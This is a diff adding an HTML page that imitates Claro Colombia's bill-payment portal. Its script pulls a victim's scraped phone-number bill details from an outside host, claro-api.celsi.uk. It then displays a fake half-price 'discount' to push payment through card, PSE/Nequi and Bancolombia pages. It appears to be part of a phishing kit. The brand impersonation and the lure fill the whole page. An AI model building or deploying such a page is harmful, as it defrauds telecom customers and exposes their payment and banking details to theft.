@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pago de Facturas - Claro</title>
+
+    <!-- Dependencias necesarias -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/datos.css">
+    
+    <style>
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e30613;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            color: #333;
+            font-weight: 500;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .price-strikethrough {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 0.9em;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .price-current {
+            color: #e30613;
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+
+        .edit-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .edit-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .edit-modal-header {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .edit-modal-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+
+        .edit-modal-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .edit-modal-button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .edit-modal-button.cancel {
+            background: #6c757d;
+            color: white;
+        }
+
+        .edit-modal-button.save {
+            background: #e30613;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <img src="img/iconos-logo-claro.png" alt="">
+        <img src="img/ellipsis.gif" width="25%" alt="">
+    </div>
+
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="top-bar-container">
+            <div class="top-bar-left">
+                <a href="#" class="top-bar-link">Personas</a>
+                <a href="#" class="top-bar-link">Negocios</a>
+                <a href="#" class="top-bar-link">Empresas</a>
+            </div>
+            <div class="top-bar-right">
+                <a href="#" class="top-bar-item">
+                    <span>Más de Claro</span>
+                    <i class="fas fa-chevron-down"></i>
+                </a>
+                <a href="#" class="top-bar-item">
+                    <img src="https://flagcdn.com/w40/co.png" alt="Colombia" class="flag-icon">
+                    <i class="fas fa-chevron-down"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Header -->
+    <div class="main-header">
+        <div class="main-header-container">
+            <div class="header-left">
+                <div class="logo">
+                    <img src="img/imgi_18_logo-claro-blanco.svg" alt="Claro logo">
+                </div>
+                <nav class="main-nav">
+                    <a href="#" class="nav-item">
+                        Servicios
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Tienda
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Beneficios
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Soporte
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                </nav>
+            </div>
+
+            <div style="width: 300px; color: transparent;">a</div>
+
+            <div class="header-right">
+                <a href="#" class="header-link user-link">
+                    <i class="fas fa-user-circle"></i>
+                    Mi Claro
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Portal Title and Progress Steps -->
+    <div class="portal-title-section">
+        <h1 class="portal-title">
+            Portal de <span class="portal-title-highlight">PAGOS Y RECARGAS</span>
+        </h1>
+
+        <div class="progress-steps">
+            <div class="step active">
+                <div class="step-icon-wrapper">
+                   <img src="img/imgi_20_icono-seleccion-on.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Selecciona</span>
+                    tu servicio
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                    <img src="img/icono-mediopago-on.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Escoge el</span>
+                    medio de pago
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                   <img src="img/imgi_22_icono-pago-off.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Realiza el</span>
+                    pago en línea
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                    <img src="img/imgi_23_icono-resultado-off.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Recibe la</span>
+                    confirmación
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Section -->
+    <div class="payment-section">
+        <div class="payment-card">
+            <div class="payment-header">
+                Paga tu factura Postpago
+            </div>
+            <div class="payment-body">
+                <div class="payment-row">
+                    <div class="payment-label">Valor TOTAL de saldo a pagar:</div>
+                    <div class="payment-value highlight">
+                        $ 104.956,11
+                        <a href="#" class="edit-link">
+                            <i class="fas fa-edit"></i> Editar
+                        </a>
+                    </div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Número Celular:</div>
+                    <div class="payment-value">*******9901</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Pague antes de:</div>
+                    <div class="payment-value">22/10/2025</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Valor a pagar por servicios + Suplementarios:</div>
+                    <div class="payment-value">$ 0,00</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Valor a pagar por equipo:</div>
+                    <div class="payment-value">$ 0,00</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Fecha de carga de minutos:</div>
+                    <div class="payment-value">11/11/2025</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Referencia de pago:</div>
+                    <div class="payment-value">*******1742</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="payment-method-section">
+            <h2 class="payment-method-title">Selecciona el medio de pago</h2>
+            <p class="payment-method-text">
+                Si ya dispones de una tarjeta <strong>Débito que funciona como crédito</strong> tendrás la oportunidad de utilizarla en la plataforma de Claro, debes asegurarte que en la parte de atrás tenga el código de Seguridad, para más información comunícate con tu banco.
+            </p>
+        </div>
+    </div>
+
+    <!-- Payment Options Dropdown -->
+    <div class="payment-options-container">
+        <div class="payment-dropdown" id="paymentDropdown">
+            Seleccione medio de pago
+        </div>
+
+        <div class="payment-options-list" id="paymentOptionsList">
+            <a href="tarjeta-credito.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_2.png" alt="Tarjeta crédito">
+                </div>
+                <div class="payment-option-text">Tarjeta crédito</div>
+            </a>
+
+            <a href="pse.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_1.png" alt="PSE">
+                </div>
+                <div class="payment-option-text">PSE/NEQUI</div>
+                <!-- <div class="payment-option-badges">
+                    <img src="img/badge-nequi.png" alt="Nequi" style="height: 20px;">
+                    <img src="img/badge-daviplata.png" alt="Daviplata" style="height: 20px;">
+                </div> -->
+            </a>
+
+            <a href="bancolombia.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_18.png" alt="Bancolombia">
+                </div>
+                <div class="payment-option-text">Botón Bancolombia</div>
+            </a>
+
+            <!-- <a href="daviplata.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_10.png" alt="Daviplata">
+                </div>
+                <div class="payment-option-text">Daviplata</div>
+            </a>
+
+            <a href="codensa.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_6.png" alt="Codensa">
+                </div>
+                <div class="payment-option-text">Tarjeta Codensa</div>
+            </a>
+
+            <a href="tarjetas-registradas.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_4.png" alt="Mis tarjetas">
+                </div>
+                <div class="payment-option-text">Mis tarjetas registradas</div> -->
+            </a>
+        </div>
+    </div>
+
+    <!-- Edit Modal -->
+    <div class="edit-modal" id="editModal">
+        <div class="edit-modal-content">
+            <div class="edit-modal-header">Editar valor a pagar</div>
+            <input type="text" class="edit-modal-input" id="editInput" placeholder="Ingrese el valor a pagar">
+            <div class="edit-modal-buttons">
+                <button class="edit-modal-button cancel" onclick="closeEditModal()">Cancelar</button>
+                <button class="edit-modal-button save" onclick="saveEditValue()">Guardar</button>
+            </div>
+        </div>
+    </div>
+
+   <script>
+    const API_BASE = 'https://claro-api.celsi.uk';
+    let originalPrice = 0;
+
+    function updateLoadingText(text) {
+        const loadingText = document.getElementById('loadingText');
+        if (loadingText) {
+            loadingText.textContent = text;
+        }
+    }
+
+    function hideLoading() {
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        if (loadingOverlay) {
+            loadingOverlay.style.display = 'none';
+        }
+    }
+
+    function openEditModal() {
+        const modal = document.getElementById('editModal');
+        const input = document.getElementById('editInput');
+        if (modal && input) {
+            input.value = formatPrice(originalPrice);
+            modal.style.display = 'flex';
+        }
+    }
+
+    function closeEditModal() {
+        const modal = document.getElementById('editModal');
+        if (modal) {
+            modal.style.display = 'none';
+        }
+    }
+
+    function saveEditValue() {
+        const input = document.getElementById('editInput');
+        if (input && input.value) {
+            const cleanValue = input.value.replace(/[^\d,]/g, '');
+            const newPrice = parseFloat(cleanValue.replace(',', '.'));
+            
+            if (!isNaN(newPrice) && newPrice > 0) {
+                updatePriceDisplay(newPrice, newPrice);
+                closeEditModal();
+            } else {
+                alert('Por favor ingrese un valor válido');
+            }
+        }
+    }
+
+    function formatPrice(price) {
+        const parts = price.toFixed(2).split('.');
+        parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+        return parts.join(',');
+    }
+
+    function updatePriceDisplay(fullPrice, discountedPrice) {
+        const valEls = document.querySelectorAll('.payment-value.highlight');
+        if (valEls && valEls.length > 0) {
+            valEls[0].innerHTML = `
+                <span class="price-strikethrough">$ ${formatPrice(fullPrice)}</span>
+                <span class="price-current">$ ${formatPrice(discountedPrice)}</span>
+                <a href="#" class="edit-link" onclick="event.preventDefault(); openEditModal();">
+                    <i class="fas fa-edit"></i> Editar
+                </a>
+            `;
+        }
+    }
+
+    async function fetchAndRenderDetails() {
+        const numero = sessionStorage.getItem('scraper_numero');
+        
+        console.log('='.repeat(60));
+        console.log('DATOS.HTML - Iniciando carga de detalles');
+        console.log('='.repeat(60));
+        console.log('Número en sessionStorage:', numero);
+        
+        if (!numero) {
+            console.error('❌ No hay número en sessionStorage');
+            hideLoading();
+            showNoPayments();
+            return;
+        }
+        
+        try {
+            updateLoadingText('Buscando información...');
+            await new Promise(resolve => setTimeout(resolve, 800));
+            
+            updateLoadingText('Conectando con los servicios Claro...');
+            await new Promise(resolve => setTimeout(resolve, 800));
+            
+            console.log(`Haciendo fetch a: ${API_BASE}/api/details/${encodeURIComponent(numero)}`);
+            
+            const resp = await fetch(`${API_BASE}/api/details/${encodeURIComponent(numero)}`, { 
+                method: 'GET', 
+                mode: 'cors', 
+                credentials: 'include',
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+            
+            console.log('Response status:', resp.status);
+            console.log('Response headers:', [...resp.headers.entries()]);
+            
+            if (!resp.ok) {
+                console.error('❌ Response not OK:', resp.status, resp.statusText);
+                hideLoading();
+                showNoPayments();
+                return;
+            }
+            
+            updateLoadingText('Información encontrada...');
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            const j = await resp.json();
+            console.log('✓ JSON recibido:', j);
+            
+            if (!j.found) {
+                console.error('❌ No se encontraron datos (found=false)');
+                console.log('Error del servidor:', j.error || 'Sin error específico');
+                hideLoading();
+                showNoPayments();
+                return;
+            }
+            
+            if (!j.details) {
+                console.error('❌ Objeto details es null/undefined');
+                hideLoading();
+                showNoPayments();
+                return;
+            }
+            
+            const d = j.details;
+            console.log('Detalles a renderizar:', d);
+            
+            const hasAnyData = Object.values(d).some(val => val && val !== '—');
+            
+            if (!hasAnyData) {
+                console.error('❌ Todos los campos están vacíos');
+                hideLoading();
+                showNoPayments();
+                return;
+            }
+            
+            updateLoadingText('Factura encontrada...');
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            updateLoadingText('Cargando factura...');
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            console.log('✓ Datos válidos encontrados, renderizando...');
+            
+            const valorTotalStr = d.valor_total || '$ 0,00';
+            const cleanPrice = valorTotalStr.replace(/[^\d]/g, '');
+            const fullPrice = parseFloat(cleanPrice) / 100;
+            const discountedPrice = fullPrice / 2;
+            
+            originalPrice = fullPrice;
+            
+            updatePriceDisplay(fullPrice, discountedPrice);
+            console.log('✓ Valor total actualizado con descuento');
+            
+            const allVals = document.querySelectorAll('.payment-value');
+            let nonHighlight = Array.from(allVals).filter(el => !el.classList.contains('highlight'));
+            
+            console.log(`Encontrados ${nonHighlight.length} elementos .payment-value`);
+            
+            if (nonHighlight.length >= 6) {
+                nonHighlight[0].textContent = d.celular || '—';
+                nonHighlight[1].textContent = d.pague_antes || '—';
+                nonHighlight[2].textContent = d.valor_servicios || '—';
+                nonHighlight[3].textContent = d.valor_equipo || '—';
+                nonHighlight[4].textContent = d.fecha_carga || '—';
+                nonHighlight[5].textContent = d.referencia || '—';
+                
+                console.log('✓✓✓ TODOS LOS CAMPOS ACTUALIZADOS ✓✓✓');
+                console.log('Celular:', d.celular);
+                console.log('Pague antes:', d.pague_antes);
+                console.log('Valor servicios:', d.valor_servicios);
+                console.log('Valor equipo:', d.valor_equipo);
+                console.log('Fecha carga:', d.fecha_carga);
+                console.log('Referencia:', d.referencia);
+                console.log('='.repeat(60));
+            } else {
+                console.warn(`⚠ Elementos insuficientes: ${nonHighlight.length}/6`);
+                
+                const container = document.querySelector('.payment-body') || document.querySelector('.payment-section');
+                if (container) {
+                    const debugBox = document.createElement('div');
+                    debugBox.style.cssText = 'padding:20px; border:2px solid #e30613; margin:20px 0; background:#fff3f3; border-radius:8px; font-family:Arial,sans-serif;';
+                    debugBox.innerHTML = `
+                        <h3 style="color:#e30613; margin:0 0 15px 0; font-size:18px;">📋 Detalles de Pago Extraídos</h3>
+                        <div style="line-height:2;">
+                            <div><strong>Valor Total:</strong> 
+                                <div>
+                                    <span style="text-decoration:line-through; color:#999;">$ ${formatPrice(fullPrice)}</span><br>
+                                    <span style="color:#e30613; font-size:18px; font-weight:bold;">$ ${formatPrice(discountedPrice)}</span>
+                                </div>
+                            </div>
+                            <div><strong>Número Celular:</strong> ${d.celular || '—'}</div>
+                            <div><strong>Pague antes de:</strong> ${d.pague_antes || '—'}</div>
+                            <div><strong>Valor servicios + Suplementarios:</strong> ${d.valor_servicios || '—'}</div>
+                            <div><strong>Valor por equipo:</strong> ${d.valor_equipo || '—'}</div>
+                            <div><strong>Fecha de carga:</strong> ${d.fecha_carga || '—'}</div>
+                            <div><strong>Referencia:</strong> ${d.referencia || '—'}</div>
+                        </div>
+                    `;
+                    container.appendChild(debugBox);
+                    console.log('✓ Box alternativo de detalles insertado');
+                }
+            }
+            
+            hideLoading();
+            
+        } catch (err) {
+            console.error('❌ EXCEPTION en fetchAndRenderDetails:');
+            console.error('Error:', err);
+            console.error('Stack:', err.stack);
+            hideLoading();
+            showNoPayments();
+        }
+    }
+
+    function showNoPayments() {
+        console.log('Mostrando mensaje de "sin pagos"');
+        const paymentSection = document.querySelector('.payment-section');
+        if (paymentSection) {
+            paymentSection.innerHTML = `
+                <div style="text-align:center; padding:60px 20px;">
+                    <div style="font-size:64px; margin-bottom:20px;">❌</div>
+                    <h3 style="color:#c0392b; margin:0 0 15px 0; font-size:24px;">No se encontraron pagos pendientes</h3>
+                    <p style="color:#666; margin:0 0 30px 0; font-size:16px;">No hay facturas pendientes de pago para este número.</p>
+                    <button onclick="window.location.href='index.html'" style="padding:14px 32px; background:#e30613; color:white; border:none; border-radius:6px; cursor:pointer; font-size:16px; font-weight:500;">
+                        ← Volver al inicio
+                    </button>
+                </div>
+            `;
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('DOMContentLoaded - Iniciando...');
+        
+        setTimeout(() => {
+            fetchAndRenderDetails();
+        }, 500);
+    });
+
+    const dropdown = document.getElementById('paymentDropdown');
+    const optionsList = document.getElementById('paymentOptionsList');
+
+    if (dropdown && optionsList) {
+        dropdown.addEventListener('click', function() {
+            this.classList.toggle('active');
+            optionsList.classList.toggle('show');
+        });
+    }
+</script>
+</body>
+</html>
